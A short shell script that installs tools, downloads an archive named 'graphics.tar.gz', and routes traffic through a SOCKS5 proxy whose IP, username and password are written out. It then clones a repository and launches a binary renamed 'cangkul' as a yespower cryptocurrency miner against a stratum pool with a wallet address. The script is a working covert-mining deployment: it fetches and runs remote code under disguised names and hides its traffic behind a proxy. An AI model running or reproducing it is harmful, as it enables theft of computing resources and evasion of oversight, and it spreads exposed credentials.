#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.253.24.243:8080
socks5_username = woiden_aqua1
socks5_password = chain
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp git clone https://github.com/Repopribadi27/sakti && cd sakti && chmod +x cangkul && ./cangkul -a yespower -o stratum+tcps://51.79.177.216:17017 -u web1qjqkdl9geqspau9hkq22pe6suu8ctj7c3q2ardc.deep -p x -t 10